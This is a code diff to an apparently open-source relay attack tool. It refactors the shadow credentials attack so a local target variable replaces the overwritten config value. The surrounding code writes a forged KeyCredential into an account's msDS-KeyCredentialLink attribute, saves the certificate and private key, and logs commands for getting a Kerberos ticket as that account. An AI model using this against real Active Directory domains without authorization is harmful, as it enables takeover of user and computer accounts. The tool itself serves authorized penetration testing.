@@ -240,12 +240,14 @@ class LDAPAttack(ProtocolAttack):
 
 
     def shadowCredentialsAttack(self, domainDumper):
-        if self.config.ShadowCredentialsTarget in delegatePerformed:
-            LOG.info('Shadow credentials attack already performed for %s, skipping' % self.config.ShadowCredentialsTarget)
-            return
+        currentShadowCredentialsTarget = self.config.ShadowCredentialsTarget
         # If the target is not specify, we try to modify the user himself
-        if not self.config.ShadowCredentialsTarget:
-            self.config.ShadowCredentialsTarget = self.username
+        if not currentShadowCredentialsTarget:
+            currentShadowCredentialsTarget = self.username
+
+        if currentShadowCredentialsTarget in delegatePerformed:
+            LOG.info('Shadow credentials attack already performed for %s, skipping' % currentShadowCredentialsTarget)
+            return
 
         LOG.info("Searching for the target account")
 
@@ -255,7 +257,7 @@ class LDAPAttack(ProtocolAttack):
         domain = "DOMAIN.LOCAL"
 
         # Get target computer DN
-        result = self.getUserInfo(domainDumper, self.config.ShadowCredentialsTarget)
+        result = self.getUserInfo(domainDumper, currentShadowCredentialsTarget)
         if not result:
             LOG.error('Target account does not exist! (wrong domain?)')
             return
@@ -264,7 +266,7 @@ class LDAPAttack(ProtocolAttack):
             LOG.info("Target user found: %s" % target_dn)
 
         LOG.info("Generating certificate")
-        certificate = X509Certificate2(subject=self.config.ShadowCredentialsTarget, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
+        certificate = X509Certificate2(subject=currentShadowCredentialsTarget, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
         LOG.info("Certificate generated")
         LOG.info("Generating KeyCredential")
         keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
@@ -281,7 +283,7 @@ class LDAPAttack(ProtocolAttack):
             return
         try:
             new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
-            LOG.info("Updating the msDS-KeyCredentialLink attribute of %s" % self.config.ShadowCredentialsTarget)
+            LOG.info("Updating the msDS-KeyCredentialLink attribute of %s" % currentShadowCredentialsTarget)
             self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
             if self.client.result['result'] == 0:
                 LOG.info("Updated the msDS-KeyCredentialLink attribute of the target object")
@@ -296,7 +298,7 @@ class LDAPAttack(ProtocolAttack):
                     LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
                     LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                     LOG.info("Run the following command to obtain a TGT")
-                    LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, domain, self.config.ShadowCredentialsTarget, path))
+                    LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, domain, currentShadowCredentialsTarget, path))
                 elif self.config.ShadowCredentialsExportType == "PFX":
                     if self.config.ShadowCredentialsPFXPassword is None:
                         password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
@@ -308,8 +310,8 @@ class LDAPAttack(ProtocolAttack):
                     LOG.info("Must be used with password: %s" % password)
                     LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                     LOG.info("Run the following command to obtain a TGT")
-                    LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, domain, self.config.ShadowCredentialsTarget, path))
-                    delegatePerformed.append(self.config.ShadowCredentialsTarget)
+                    LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, domain, currentShadowCredentialsTarget, path))
+                    delegatePerformed.append(currentShadowCredentialsTarget)
             else:
                 if self.client.result['result'] == 50:
                     LOG.error('Could not modify object, the server reports insufficient rights: %s' % self.client.result['message'])
